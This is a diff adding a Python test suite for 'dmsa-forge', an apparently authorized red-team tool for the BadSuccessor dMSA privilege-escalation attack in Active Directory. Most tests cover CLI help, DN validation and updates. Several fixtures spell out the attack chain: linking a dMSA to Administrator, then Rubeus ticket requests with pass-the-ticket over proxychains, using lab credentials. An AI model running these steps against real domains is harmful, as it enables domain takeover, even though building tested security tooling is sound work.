@@ -1,0 +1,1649 @@
+import contextlib
+import io
+import json
+import os
+import subprocess
+import sys
+import tempfile
+import types
+import unittest
+
+from dmsa_forge import cli
+
+
+REPO_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
+BASE_ARGS = [
+    'test.local/admin:pw',
+    '--target-ou',
+    'OU=Staff,DC=test,DC=local',
+    '--target-account',
+    'Administrator',
+    '--scope-domain',
+    'test.local',
+    '--scope-base-dn',
+    'DC=test,DC=local',
+]
+
+
+def run_cli(*args, cwd=None, env_overrides=None):
+    env = os.environ.copy()
+    env['PYTHONPATH'] = REPO_ROOT + os.pathsep + env.get('PYTHONPATH', '')
+    if env_overrides:
+        for key, value in env_overrides.items():
+            if value is None:
+                env.pop(key, None)
+            else:
+                env[key] = value
+    return subprocess.run(
+        [sys.executable, '-m', 'dmsa_forge.cli'] + list(args),
+        stdout=subprocess.PIPE,
+        stderr=subprocess.PIPE,
+        text=True,
+        cwd=cwd,
+        env=env,
+    )
+
+
+class FakeLDAPConnection:
+    def __init__(self, success=False, result=None, entries=None):
+        self.success = success
+        self.result = result
+        self.entries = list(entries or [])
+
+    def search(self, **kwargs):
+        return self.success
+
+
+def minimal_forge():
+    forge = object.__new__(cli.DMSAForge)
+    forge._scope_base_dn = 'DC=test,DC=local'
+    forge._base_dn = 'DC=test,DC=local'
+    forge._redact = True
+    forge._allow_admin_fallback = False
+    forge._dmsa_name_supplied = False
+    forge.report = {'inference': []}
+    return forge
+
+
+def execution_options(**overrides):
+    values = dict(cli.CLI_DEFAULTS)
+    values.update({
+        'account': 'test.local/admin:pw',
+        'action': 'search',
+        'base_dn': 'DC=test,DC=local',
+        'scope_domain': 'test.local',
+        'scope_base_dn': 'DC=test,DC=local',
+        'operation_id': 'test-operation',
+        'skip_dc_prereq': True,
+    })
+    values.update(overrides)
+    return cli.argparse.Namespace(**values)
+
+
+class DNValidationTests(unittest.TestCase):
+    def test_validates_escaped_dn_and_scope(self):
+        dn = r'CN=Doe\, Jane,OU=Staff,DC=test,DC=local'
+        self.assertTrue(cli.validate_dn_syntax(dn))
+        self.assertTrue(cli.dn_in_scope(dn, 'DC=test,DC=local'))
+        self.assertEqual(
+            cli.format_dn_for_display(dn, base_dn='DC=test,DC=local', redact=True),
+            r'CN=Doe\, Jane,OU=Staff,DC=test,DC=local',
+        )
+
+    def test_parent_ou_from_dn(self):
+        self.assertEqual(
+            cli.parent_ou_from_dn(r'CN=Doe\, Jane,OU=Staff,DC=test,DC=local'),
+            'OU=Staff,DC=test,DC=local',
+        )
+        self.assertEqual(
+            cli.parent_ou_from_dn('CN=User,OU=Staff,OU=People,DC=test,DC=local'),
+            'OU=Staff,OU=People,DC=test,DC=local',
+        )
+        self.assertIsNone(cli.parent_ou_from_dn('CN=Administrator,CN=Users,DC=test,DC=local'))
+
+    def test_rejects_unescaped_comma_in_dn_value(self):
+        dn = 'CN=Doe, Jane,OU=Staff,DC=test,DC=local'
+        self.assertFalse(cli.validate_dn_syntax(dn))
+
+    def test_rejects_dangling_dn_escape(self):
+        dn = 'CN=Bad,OU=Staff,DC=test,DC=local\\'
+        self.assertFalse(cli.validate_dn_syntax(dn))
+
+    def test_rejects_unescaped_boundary_spaces_in_dn_values(self):
+        self.assertFalse(cli.validate_dn_syntax('CN= John,DC=test,DC=local'))
+        self.assertFalse(cli.validate_dn_syntax('CN=John ,DC=test,DC=local'))
+
+    def test_accepts_escaped_boundary_space_and_hex_escape(self):
+        self.assertTrue(cli.validate_dn_syntax(r'CN=\ John,DC=test,DC=local'))
+        self.assertTrue(cli.validate_dn_syntax(r'CN=John\ ,DC=test,DC=local'))
+        self.assertTrue(cli.validate_dn_syntax(r'CN=John\20,DC=test,DC=local'))
+
+    def test_rejects_invalid_dn_escape_sequences(self):
+        self.assertFalse(cli.validate_dn_syntax(r'CN=John\Z,DC=test,DC=local'))
+        self.assertFalse(cli.validate_dn_syntax(r'CN=John\2G,DC=test,DC=local'))
+
+
+class CLIBehaviorTests(unittest.TestCase):
+    def test_actions_help_lists_common_actions(self):
+        result = run_cli('actions')
+
+        self.assertEqual(result.returncode, 0, msg=result.stderr)
+        self.assertIn('search', result.stdout)
+        self.assertIn('add', result.stdout)
+        self.assertIn('update', result.stdout)
+        self.assertIn('dmsa-forge help ACTION', result.stdout)
+        self.assertNotIn('doctor', result.stdout)
+        self.assertNotIn('guidance', result.stdout)
+        self.assertNotIn('modify', result.stdout)
+        self.assertNotIn('  completion', result.stdout)
+
+    def test_topicless_help_omits_diagnostics(self):
+        result = run_cli('help')
+
+        self.assertEqual(result.returncode, 0, msg=result.stderr)
+        self.assertIn('dmsa-forge help add', result.stdout)
+        self.assertNotIn('Diagnostics:', result.stdout)
+        self.assertNotIn('doctor', result.stdout)
+
+    def test_examples_help_prints_copy_ready_templates(self):
+        result = run_cli('examples')
+
+        self.assertEqual(result.returncode, 0, msg=result.stderr)
+        self.assertIn('Preview an add without LDAP', result.stdout)
+        self.assertIn('Ultra-quiet JSON report to file', result.stdout)
+        self.assertIn("--target-account 'CN=Administrator,CN=Users,DC=eighteen,DC=htb'", result.stdout)
+        self.assertNotIn('--target-account Administrator', result.stdout)
+        self.assertNotIn('\\\n', result.stdout)
+
+    def test_startup_banner_is_professional_and_local(self):
+        output = io.StringIO()
+        with contextlib.redirect_stdout(output):
+            cli.print_startup_banner()
+
+        banner = output.getvalue()
+        self.assertIn('%s %s - by %s' % (cli.TOOL_NAME, cli.TOOL_VERSION, cli.MODIFICATIONS_BY), banner)
+        self.assertIn('A redteaming tool for authorized BadSuccessor LDAP exploitation on dMSA', banner)
+        self.assertIn(".-.| | \\/ | `-.  /___\\   ____ |--- .-. .--..-.. .-.", banner)
+        self.assertIn(cli.PROJECT_URL, banner)
+        self.assertLess(
+            banner.index('A redteaming tool for authorized BadSuccessor LDAP exploitation on dMSA'),
+            banner.index(cli.PROJECT_URL),
+        )
+        self.assertIn('Email: 888256@gmail.com', banner)
+        self.assertLess(banner.index(cli.PROJECT_URL), banner.index('Email: 888256@gmail.com'))
+        self.assertIn("._.'\n%s" % cli.PROJECT_URL, banner)
+        self.assertNotIn("._.'\n\n%s" % cli.PROJECT_URL, banner)
+        self.assertNotIn('\nBy RedteamNotes\n', banner)
+        self.assertNotIn('d888888', banner)
+        self.assertNotIn('`7MM', banner)
+        self.assertNotIn('.oPYo8', banner)
+        self.assertNotIn('Impacket', banner)
+        self.assertNotIn('SecureAuth', banner)
+        self.assertNotIn('Fortra', banner)
+
+    def test_existence_check_treats_no_such_object_as_absent(self):
+        forge = minimal_forge()
+        connection = FakeLDAPConnection(result={
+            'result': 32,
+            'description': 'error',
+            'message': 'Error in searchRequest -> noSuchObject: problem 2001 (NO_OBJECT)',
+        })
+
+        self.assertFalse(forge.check_account_exists(connection, 'CN=redpen,OU=Staff,DC=test,DC=local'))
+
+    def test_existence_check_keeps_non_no_such_object_as_unknown(self):
+        forge = minimal_forge()
+        connection = FakeLDAPConnection(result={
+            'result': 50,
+            'description': 'error',
+            'message': 'insufficientAccessRights',
+        })
+
+        self.assertIsNone(forge.check_account_exists(connection, 'CN=redpen,OU=Staff,DC=test,DC=local'))
+
+    def test_action_specific_help(self):
+        result = run_cli('help', 'add')
+
+        self.assertEqual(result.returncode, 0, msg=result.stderr)
+        self.assertIn('add - create and verify a dMSA object', result.stdout)
+        self.assertIn('--target-account', result.stdout)
+
+    def test_unknown_action_specific_help_fails_cleanly(self):
+        result = run_cli('help', 'unknown')
+
+        self.assertEqual(result.returncode, 2)
+        self.assertIn('Unknown help topic', result.stderr)
+
+    def test_action_first_and_legacy_action_cannot_be_mixed(self):
+        result = run_cli(
+            'add',
+            'test.local/admin:pw',
+            '--action',
+            'add',
+            '--target-ou',
+            'OU=Staff,DC=test,DC=local',
+            '--target-account',
+            'Administrator',
+        )
+
+        self.assertEqual(result.returncode, 2)
+        self.assertIn('Do not combine action shortcuts with --action', result.stderr)
+
+    def test_global_help_is_grouped(self):
+        result = run_cli('-h', env_overrides={'SHELL': '/bin/zsh'})
+
+        self.assertEqual(result.returncode, 0, msg=result.stderr)
+        self.assertIn('usage: dmsa-forge', result.stdout)
+        self.assertIn('add', result.stdout)
+        self.assertIn('update', result.stdout)
+        self.assertNotIn('Diagnostics:', result.stdout)
+        self.assertNotIn('local readiness:', result.stdout)
+        self.assertNotIn('dmsa-forge doctor', result.stdout)
+        self.assertNotIn('dmsa-forge doctor [domain/]username[:password]', result.stdout)
+        self.assertNotIn('doctor       Inspect local inputs without LDAP writes.', result.stdout)
+        self.assertNotIn(cli.TOOL_DESCRIPTION + '\n\npositional arguments:', result.stdout)
+        self.assertIn('Use "dmsa-forge ACTION -h" for action-specific options. Completion for this shell session: eval "$(dmsa-forge --completion-script zsh)"', result.stdout)
+        self.assertNotIn('Completion for this shell session:\n', result.stdout)
+        self.assertIn('-v, --version', result.stdout)
+        self.assertNotIn('--version, -v', result.stdout)
+        self.assertNotIn('Legacy', result.stdout)
+        self.assertNotIn('LDAP' + '-stage research', result.stdout)
+        self.assertIn('eval "$(dmsa-forge --completion-script zsh)"', result.stdout)
+
+    def test_empty_command_prints_help(self):
+        result = run_cli(env_overrides={'SHELL': '/bin/zsh'})
+
+        self.assertEqual(result.returncode, 0, msg=result.stderr)
+        self.assertIn('usage: dmsa-forge', result.stdout)
+        self.assertNotIn('Diagnostics:', result.stdout)
+        self.assertNotIn('local readiness:', result.stdout)
+        self.assertNotIn('dmsa-forge doctor', result.stdout)
+        self.assertNotIn('dmsa-forge doctor [domain/]username[:password]', result.stdout)
+        self.assertNotIn('doctor       Inspect local inputs without LDAP writes.', result.stdout)
+        self.assertIn('Use "dmsa-forge ACTION -h" for action-specific options. Completion for this shell session: eval "$(dmsa-forge --completion-script zsh)"', result.stdout)
+        self.assertIn('-v, --version', result.stdout)
+        self.assertNotIn('Legacy', result.stdout)
+        self.assertNotIn('LDAP' + '-stage research', result.stdout)
+
+    def test_main_restores_cwd_for_empty_command_path(self):
+        with tempfile.TemporaryDirectory() as tmpdir:
+            start_cwd = os.getcwd()
+            changed_cwd = os.path.join(tmpdir, 'changed')
+            os.mkdir(changed_cwd)
+
+            def fake_help(parser, shell=None, no_banner=False):
+                os.chdir(changed_cwd)
+
+            original_help = cli.print_parser_help_with_hint
+            try:
+                cli.print_parser_help_with_hint = fake_help
+                result = cli.main([])
+            finally:
+                cli.print_parser_help_with_hint = original_help
+                os.chdir(start_cwd)
+
+        self.assertEqual(result, 0)
+        self.assertEqual(os.getcwd(), start_cwd)
+
+    def test_main_restores_cwd_for_completion_path(self):
+        with tempfile.TemporaryDirectory() as tmpdir:
+            start_cwd = os.getcwd()
+            changed_cwd = os.path.join(tmpdir, 'changed')
+            os.mkdir(changed_cwd)
+
+            def fake_completion(shell):
+                os.chdir(changed_cwd)
+                return 0
+
+            original_completion = cli.run_completion_script
+            try:
+                cli.run_completion_script = fake_completion
+                result = cli.main(['--completion-script', 'zsh'])
+            finally:
+                cli.run_completion_script = original_completion
+                os.chdir(start_cwd)
+
+        self.assertEqual(result, 0)
+        self.assertEqual(os.getcwd(), start_cwd)
+
+    def test_version_short_flag(self):
+        result = run_cli('-v')
+
+        self.assertEqual(result.returncode, 0, msg=result.stderr)
+        self.assertIn(cli.TOOL_VERSION, result.stdout)
+
+    def test_action_first_help_is_action_specific(self):
+        result = run_cli('add', '-h')
+
+        self.assertEqual(result.returncode, 0, msg=result.stderr)
+        self.assertIn('usage: dmsa-forge add', result.stdout)
+        self.assertIn('--target-account', result.stdout)
+        self.assertIn('local controls:', result.stdout)
+        self.assertIn('--help-advanced', result.stdout)
+        self.assertNotIn('\\\n', result.stdout)
+        self.assertNotIn('--hashes', result.stdout)
+        self.assertNotIn('--allow-admin-fallback', result.stdout)
+        self.assertNotIn('--next-step-prefix', result.stdout)
+
+    def test_action_advanced_help_is_available(self):
+        result = run_cli('add', '--help-advanced')
+
+        self.assertEqual(result.returncode, 0, msg=result.stderr)
+        self.assertIn('advanced options for add', result.stdout)
+        self.assertIn('--hashes', result.stdout)
+        self.assertIn('--allow-admin-fallback', result.stdout)
+        self.assertIn('--next-step-prefix', result.stdout)
+        self.assertNotIn('DMSA_FORGE_NEXT_STEP_PREFIX', result.stdout)
+
+    def test_plan_command_maps_to_dry_run(self):
+        result = run_cli('plan', 'add', *BASE_ARGS, '--output-only')
+
+        self.assertEqual(result.returncode, 0, msg=result.stderr)
+        payload = json.loads(result.stdout)
+        self.assertEqual(payload['action'], 'add')
+        self.assertEqual(payload['mode'], 'dry_run')
+        self.assertTrue(payload['controls']['dry_run'])
+
+    def test_completion_script_hidden_flag_outputs_shell_snippets(self):
+        zsh = run_cli('--completion-script', 'zsh')
+        bash = run_cli('--completion-script', 'bash')
+
+        self.assertEqual(zsh.returncode, 0, msg=zsh.stderr)
+        self.assertEqual(bash.returncode, 0, msg=bash.stderr)
+        self.assertIn('eval "$(dmsa-forge --completion-script zsh)"', zsh.stdout)
+        self.assertIn('compdef _dmsa_forge dmsa-forge dmsaforge', zsh.stdout)
+        self.assertIn('complete -F _dmsa_forge_completion dmsa-forge', bash.stdout)
+        self.assertIn('complete -F _dmsa_forge_completion dmsaforge', bash.stdout)
+        self.assertIn('update', zsh.stdout)
+        self.assertIn('update', bash.stdout)
+        self.assertNotIn('doctor', zsh.stdout)
+        self.assertNotIn('doctor', bash.stdout)
+        self.assertNotIn('completion:print completion', zsh.stdout)
+        self.assertNotIn('config', zsh.stdout)
+        self.assertNotIn('--config', zsh.stdout)
+        self.assertNotIn('config', bash.stdout)
+        self.assertNotIn('--config', bash.stdout)
+
+    def test_package_installs_collision_safe_alias(self):
+        with open(os.path.join(REPO_ROOT, 'pyproject.toml'), 'r', encoding='utf-8') as handle:
+            pyproject = handle.read()
+
+        self.assertIn('dmsa-forge = "dmsa_forge.cli:main"', pyproject)
+        self.assertIn('dmsaforge = "dmsa_forge.cli:main"', pyproject)
+
+    def test_config_command_and_option_are_removed(self):
+        command = run_cli('config', 'show')
+        init = run_cli('init')
+        option = run_cli('add', *BASE_ARGS, '--dry-run', '--config', 'x.toml')
+
+        self.assertEqual(command.returncode, 2)
+        self.assertEqual(init.returncode, 2)
+        self.assertEqual(option.returncode, 2)
+        self.assertIn('no longer uses project config files', command.stderr)
+        self.assertIn('no longer uses project config files', init.stderr)
+        self.assertIn('unrecognized arguments: --config', option.stderr)
+
+    def test_removed_actions_return_migration_errors(self):
+        guidance = run_cli('guidance', 'test.local/admin:pw', '--dmsa-name', 'redpen')
+        modify = run_cli('modify', *BASE_ARGS, '--dmsa-name', 'redpen', '--yes')
+        completion = run_cli('completion', 'zsh', env_overrides={'SHELL': '/bin/zsh'})
+        legacy_modify = run_cli('test.local/admin:pw', '--action', 'modify')
+
+        self.assertEqual(guidance.returncode, 2)
+        self.assertEqual(modify.returncode, 2)
+        self.assertEqual(completion.returncode, 2)
+        self.assertEqual(legacy_modify.returncode, 2)
+        self.assertIn('successful add/verify output includes Kerberos commands', guidance.stderr)
+        self.assertIn('use delete/add/verify', modify.stderr)
+        self.assertIn('--completion-script zsh', completion.stderr)
+        self.assertIn('use delete/add/verify', legacy_modify.stderr)
+
+    def test_update_dry_run_uses_current_python_environment(self):
+        source = '%s@v0.5.3' % cli.DEFAULT_UPDATE_SOURCE
+        result = run_cli('update', '--dry-run', '--no-banner', '--source', source)
+
+        self.assertEqual(result.returncode, 0, msg=result.stderr)
+        self.assertIn('Current version:', result.stdout)
+        self.assertIn('Target version:  v0.5.3', result.stdout)
+        self.assertIn('Update command:', result.stdout)
+        self.assertIn('-m pip install --upgrade', result.stdout)
+        self.assertIn(source, result.stdout)
+        self.assertNotIn('usage:', result.stderr)
+
+    def test_update_skips_when_target_version_matches(self):
+        source = '%s@%s' % (cli.DEFAULT_UPDATE_SOURCE, cli.TOOL_VERSION)
+        result = run_cli('update', '--dry-run', '--no-banner', '--source', source)
+
+        self.assertEqual(result.returncode, 0, msg=result.stderr)
+        self.assertIn('Current version:', result.stdout)
+        self.assertIn('No update required; versions match.', result.stdout)
+        self.assertNotIn('Update command:', result.stdout)
+
+    def test_update_warns_when_cwd_contains_command_named_checkout(self):
+        source = '%s@%s' % (cli.DEFAULT_UPDATE_SOURCE, cli.TOOL_VERSION)
+        with tempfile.TemporaryDirectory() as tmpdir:
+            os.mkdir(os.path.join(tmpdir, 'dmsa-forge'))
+            result = run_cli('update', '--dry-run', '--no-banner', '--source', source, cwd=tmpdir)
+
+        self.assertEqual(result.returncode, 0, msg=result.stderr)
+        self.assertIn('Shell note: current directory contains ./dmsa-forge/.', result.stdout)
+        self.assertIn('dmsaforge', result.stdout)
+
+    def test_update_quiet_suppresses_shell_collision_note(self):
+        source = '%s@%s' % (cli.DEFAULT_UPDATE_SOURCE, cli.TOOL_VERSION)
+        with tempfile.TemporaryDirectory() as tmpdir:
+            os.mkdir(os.path.join(tmpdir, 'dmsa-forge'))
+            result = run_cli('update', '--dry-run', '--no-banner', '--quiet', '--source', source, cwd=tmpdir)
+
+        self.assertEqual(result.returncode, 0, msg=result.stderr)
+        self.assertNotIn('Shell note:', result.stdout)
+
+    def test_update_unknown_source_requires_force(self):
+        result = run_cli('update', '--dry-run', '--no-banner', '--source', 'git+https://example.test/project.git')
+
+        self.assertEqual(result.returncode, 1)
+        self.assertIn('Could not determine update target version', result.stderr)
+        self.assertIn('update --force', result.stderr)
+        self.assertNotIn('Update command:', result.stdout)
+
+    def test_update_force_runs_without_version_check(self):
+        source = 'git+https://example.test/project.git'
+        result = run_cli('update', '--dry-run', '--no-banner', '--force', '--source', source)
+
+        self.assertEqual(result.returncode, 0, msg=result.stderr)
+        self.assertIn('Update command:', result.stdout)
+        self.assertIn(source, result.stdout)
+
+    def test_update_restores_working_directory(self):
+        with tempfile.TemporaryDirectory() as tmpdir:
+            start_cwd = os.getcwd()
+            changed_cwd = os.path.join(tmpdir, 'changed')
+            os.mkdir(changed_cwd)
+
+            def fake_run(command, cwd=None):
+                self.assertEqual(cwd, start_cwd)
+                os.chdir(changed_cwd)
+                return types.SimpleNamespace(returncode=0)
+
+            original_run = cli.subprocess.run
+            try:
+                cli.subprocess.run = fake_run
+                options = execution_options(
+                    action='update',
+                    force=True,
+                    dry_run=False,
+                    quiet=True,
+                    no_banner=True,
+                    update_source='git+https://example.test/project.git',
+                )
+                result = cli.run_update(options)
+            finally:
+                cli.subprocess.run = original_run
+                os.chdir(start_cwd)
+
+        self.assertEqual(result, 0)
+        self.assertEqual(os.getcwd(), start_cwd)
+
+    def test_default_update_source_is_pinned_to_resolved_release_tag(self):
+        self.assertEqual(
+            cli.update_source_for_command(cli.DEFAULT_UPDATE_SOURCE, cli.TOOL_VERSION, 'latest GitHub release'),
+            '%s@%s' % (cli.DEFAULT_UPDATE_SOURCE, cli.TOOL_VERSION),
+        )
+
+    def test_ldap_compat_skips_non_entry_search_answers(self):
+        class SearchReference:
+            def __getitem__(self, key):
+                raise TypeError("'<' not supported between instances of 'str' and 'int'")
+
+        compat = object.__new__(cli.LDAPCompat)
+
+        self.assertEqual(compat._entries_from_answers([SearchReference()]), [])
+
+    def test_execute_rejects_invalid_dmsa_name_before_ldap(self):
+        result = run_cli('add', *BASE_ARGS, '--dmsa-name', 'bad,name', '--dry-run', '--output-only')
+
+        self.assertEqual(result.returncode, 2)
+        self.assertIn('--dmsa-name must be a DNS-safe label', result.stderr)
+
+    def test_execute_rejects_invalid_dns_hostname_before_ldap(self):
+        result = run_cli('add', *BASE_ARGS, '--dns-hostname', 'not-a-fqdn', '--dry-run', '--output-only')
+
+        self.assertEqual(result.returncode, 2)
+        self.assertIn('--dns-hostname must be a DNS hostname', result.stderr)
+
+    def test_execute_rejects_invalid_principals_allowed_dn_before_ldap(self):
+        result = run_cli(
+            'add',
+            *BASE_ARGS,
+            '--principals-allowed',
+            'CN=Reader,CN=Users,DC=test,DC=local\\',
+            '--dry-run',
+            '--output-only',
+        )
+
+        self.assertEqual(result.returncode, 2)
+        self.assertIn('--principals-allowed DN is not a valid distinguished name', result.stderr)
+
+    def test_execute_rejects_principals_allowed_dn_outside_scope(self):
+        result = run_cli(
+            'add',
+            *BASE_ARGS,
+            '--principals-allowed',
+            'CN=Reader,CN=Users,DC=other,DC=local',
+            '--dry-run',
+            '--output-only',
+        )
+
+        self.assertEqual(result.returncode, 2)
+        self.assertIn('--principals-allowed DN is outside --scope-base-dn', result.stderr)
+
+    def test_output_write_failure_is_clean_error(self):
+        result = run_cli(
+            'add',
+            *BASE_ARGS,
+            '--dry-run',
+            '--output-only',
+            '--output',
+            '/no/such/directory/report.json',
+        )
+
+        self.assertEqual(result.returncode, 1)
+        self.assertEqual(result.stdout, '')
+        self.assertIn('Could not write output file', result.stderr)
+        self.assertNotIn('Traceback', result.stderr)
+
+    def test_output_only_stdout_defaults_to_json(self):
+        result = run_cli('add', *BASE_ARGS, '--dry-run', '--output-only')
+
+        self.assertEqual(result.returncode, 0, msg=result.stderr)
+        payload = json.loads(result.stdout)
+        self.assertEqual(payload['schema_version'], '1.0')
+        self.assertEqual(payload['action'], 'add')
+        self.assertTrue(payload['controls']['dry_run'])
+        self.assertTrue(payload['controls']['output_only'])
+        self.assertTrue(payload['controls']['quiet'])
+        self.assertTrue(payload['controls']['no_banner'])
+        self.assertIn('next_steps', payload['result'])
+        self.assertIn('dmsa-forge add test.local/admin:pw', payload['result']['next_steps'][0]['command'])
+        self.assertEqual(payload['controls']['next_step_prefix'], '(none)')
+
+    def test_human_add_dry_run_shows_badsuccessor_values_not_ldap_json(self):
+        result = run_cli(
+            'add',
+            'test.local/admin:pw',
+            '--target-ou',
+            'OU=Staff,DC=test,DC=local',
+            '--target-account',
+            'CN=Administrator,CN=Users,DC=test,DC=local',
+            '--principals-allowed',
+            'S-1-5-21-1-2-3-1604',
+            '--dmsa-name',
+            'redpen',
+            '--dry-run',
+            '--no-banner',
+        )
+        output = result.stdout + result.stderr
+
+        self.assertEqual(result.returncode, 0, msg=result.stderr)
+        self.assertIn('Account:', output)
+        self.assertIn('test.local/admin:pw', output)
+        self.assertIn('Method:                  LDAP (inferred)', output)
+        self.assertIn('Port:                    389 (inferred)', output)
+        self.assertIn('DC Host:                 test.local (inferred)', output)
+        self.assertIn('Base DN:                 DC=test,DC=local (inferred)', output)
+        self.assertIn('Scope Domain:            test.local (inferred)', output)
+        self.assertIn('Scope Base DN:           DC=test,DC=local (inferred)', output)
+        self.assertIn('DNS Hostname:            redpen.test.local (inferred)', output)
+        self.assertIn('BadSuccessor values:', output)
+        self.assertIn('msDS-GroupMSAMembership:', output)
+        self.assertIn('allow S-1-5-21-1-2-3-1604', output)
+        self.assertIn('msDS-ManagedAccountPrecededByLink:', output)
+        self.assertIn('CN=Administrator,CN=Users,DC=test,DC=local', output)
+        self.assertIn('dNSHostName:                        redpen.test.local (inferred)', output)
+        self.assertNotIn('Inference:', output)
+        self.assertNotIn('Planned LDAP operations:', output)
+        self.assertNotIn('Run this action:', output)
+        self.assertNotIn('\"type\": \"add\"', output)
+        self.assertNotIn('<redacted>', output)
+        self.assertNotIn('<SID>', output)
+
+    def test_human_next_step_suggests_dmsa_name_from_target_account(self):
+        result = run_cli(
+            'add',
+            'eighteen.htb/adam.scott:iloveyou1',
+            '--dc-host',
+            'dc01.eighteen.htb',
+            '--target-ou',
+            'OU=Staff,DC=eighteen,DC=htb',
+            '--target-account',
+            'redpen',
+            '--principals-allowed',
+            'S-1-5-21-1152179935-589108180-1989892463-1604',
+            '--dry-run',
+            '--no-banner',
+            env_overrides={
+                'PROXYCHAINS_CONF_FILE': 'chain1080.conf',
+                'PROXYCHAINS_QUIET_MODE': '1',
+            },
+        )
+        output = result.stdout + result.stderr
+
+        self.assertEqual(result.returncode, 0, msg=result.stderr)
+        self.assertIn('Next steps:', output)
+        self.assertIn(
+            "proxychains -f chain1080.conf -q dmsa-forge add eighteen.htb/adam.scott:iloveyou1 --dc-host dc01.eighteen.htb --target-ou OU=Staff,DC=eighteen,DC=htb --dmsa-name redpen --target-account Administrator --principals-allowed S-1-5-21-1152179935-589108180-1989892463-1604",
+            output,
+        )
+        self.assertNotIn('<TARGET_ACCOUNT_DN_OR_SAM>', output)
+        self.assertNotIn('suggested default', output)
+        self.assertNotIn('Run this action:', output)
+
+    def test_next_steps_infer_proxychains_prefix(self):
+        result = run_cli(
+            'add',
+            *BASE_ARGS,
+            '--dry-run',
+            '--output-only',
+            env_overrides={
+                'PROXYCHAINS_CONF_FILE': 'chain1080.conf',
+                'PROXYCHAINS_QUIET_MODE': '1',
+            },
+        )
+
+        self.assertEqual(result.returncode, 0, msg=result.stderr)
+        payload = json.loads(result.stdout)
+        command = payload['result']['next_steps'][0]['command']
+        self.assertTrue(
+            command.startswith('proxychains -f chain1080.conf -q dmsa-forge add test.local/admin:pw'),
+            msg=command,
+        )
+        self.assertEqual(payload['controls']['next_step_prefix'], 'proxychains -f chain1080.conf -q')
+
+    def test_next_step_prefix_can_be_explicit(self):
+        result = run_cli(
+            'add',
+            *BASE_ARGS,
+            '--dry-run',
+            '--output-only',
+            '--next-step-prefix',
+            'proxychains -f chain1080.conf -q',
+        )
+
+        self.assertEqual(result.returncode, 0, msg=result.stderr)
+        payload = json.loads(result.stdout)
+        self.assertTrue(payload['result']['next_steps'][0]['command'].startswith('proxychains -f chain1080.conf -q dmsa-forge add'))
+
+    def test_add_success_next_steps_include_direct_kerberos_commands(self):
+        options = execution_options(
+            action='add',
+            account='eighteen.htb/adam.scott:iloveyou1',
+            dc_ip='10.129.23.216',
+            dc_ip_supplied=True,
+            dmsa_name='redpen',
+            target_ou='OU=Staff,DC=eighteen,DC=htb',
+            principals_allowed='S-1-5-21-1152179935-589108180-1989892463-1604',
+        )
+        report = {'result': {}}
+
+        cli.attach_next_steps(report, options, mode='execute', success=True)
+
+        commands = [step['command'] for step in report['result']['next_steps']]
+        joined = '\n'.join(commands)
+        self.assertIn(r'.\Rubeus.exe asktgt /user:adam.scott /password:iloveyou1 /domain:eighteen.htb /dc:10.129.23.216 /outfile:adam.scott.kirbi /nowrap', joined)
+        self.assertIn(r".\Rubeus.exe asktgs /dmsa /opsec /service:krbtgt/EIGHTEEN.HTB /targetuser:'redpen$' /ticket:adam.scott.kirbi /dc:10.129.23.216 /ptt /nowrap", joined)
+        self.assertNotIn('--kerberos-guidance', joined)
+        self.assertNotIn('<DC_IPV4>', joined)
+        self.assertNotIn('<PASSWORD>', joined)
+
+    def test_resolved_dc_ip_only_changes_kerberos_next_steps(self):
+        options = execution_options(
+            action='add',
+            account='eighteen.htb/adam.scott:iloveyou1',
+            dc_host='dc01.eighteen.htb',
+            dc_host_supplied=True,
+            dc_ip=None,
+            resolved_dc_ip='10.129.23.216',
+            dmsa_name='redpen',
+            target_ou='OU=Staff,DC=eighteen,DC=htb',
+        )
+        report = {'result': {}}
+
+        cli.attach_next_steps(report, options, mode='execute', success=True)
+
+        commands = [step['command'] for step in report['result']['next_steps']]
+        self.assertIn('--dc-host dc01.eighteen.htb', commands[0])
+        self.assertNotIn('--dc-ip 10.129.23.216', commands[0])
+        self.assertIn('/dc:10.129.23.216', '\n'.join(commands[2:]))
+
+    def test_failed_execution_has_no_next_steps(self):
+        options = execution_options(action='search')
+        report = {'result': {'error_code': 'ou_search_failed'}}
+
+        cli.attach_next_steps(report, options, mode='execute', success=False)
+
+        self.assertEqual(report['result']['next_steps'], [])
+
+    def test_empty_search_result_has_no_next_steps(self):
+        options = execution_options(action='search')
+        report = {'result': {'mode': 'summary', 'ou_count': 0}}
+
+        cli.attach_next_steps(report, options, mode='execute', success=True)
+
+        self.assertEqual(report['result']['next_steps'], [])
+
+    def test_empty_security_descriptor_analysis_has_no_next_steps(self):
+        options = execution_options(action='search', include_sd=True, resolve_names=True)
+        report = {'result': {'mode': 'security_descriptor_analysis', 'ou_count': 1, 'identity_count': 0}}
+
+        cli.attach_next_steps(report, options, mode='execute', success=True)
+
+        self.assertEqual(report['result']['next_steps'], [])
+
+    def test_search_next_steps_start_with_add_plan_for_discovered_candidate(self):
+        options = execution_options(
+            action='search',
+            account='test.local/admin:pw',
+            dc_host='dc01.test.local',
+            dc_host_supplied=True,
+            include_sd=True,
+            resolve_names=False,
+        )
+        report = {
+            'result': {
+                'mode': 'security_descriptor_analysis',
+                'ou_count': 1,
+                'identity_count': 1,
+                '_next_step_candidates': [
+                    {
+                        'identity': 'S-1-5-21-1-2-3-1604',
+                        'target_ou': 'OU=Staff,DC=test,DC=local',
+                    }
+                ],
+            }
+        }
+
+        cli.attach_next_steps(report, options, mode='execute', success=True)
+
+        command = report['result']['next_steps'][0]['command']
+        self.assertEqual(report['result']['next_steps'][0]['label'], 'Review add plan for discovered principal')
+        self.assertIn('dmsa-forge plan add test.local/admin:pw', command)
+        self.assertIn('--dc-host dc01.test.local', command)
+        self.assertIn('--target-ou OU=Staff,DC=test,DC=local', command)
+        self.assertIn('--dmsa-name redpen', command)
+        self.assertIn('--principals-allowed S-1-5-21-1-2-3-1604', command)
+        self.assertIn('--target-account Administrator', command)
+        self.assertNotIn('<TARGET_ACCOUNT_DN_OR_SAM>', command)
+        self.assertNotIn('hint', report['result']['next_steps'][0])
+        self.assertNotIn('_next_step_candidates', report['result'])
+
+    def test_search_next_steps_keep_proxychains_for_add_plan(self):
+        options = execution_options(
+            action='search',
+            account='test.local/admin:pw',
+            include_sd=True,
+            next_step_prefix='proxychains -f chain1080.conf -q',
+        )
+        report = {
+            'result': {
+                'mode': 'security_descriptor_analysis',
+                'ou_count': 1,
+                'identity_count': 1,
+                '_next_step_candidates': [
+                    {
+                        'identity': 'S-1-5-21-1-2-3-1604',
+                        'target_ou': 'OU=Staff,DC=test,DC=local',
+                    }
+                ],
+            }
+        }
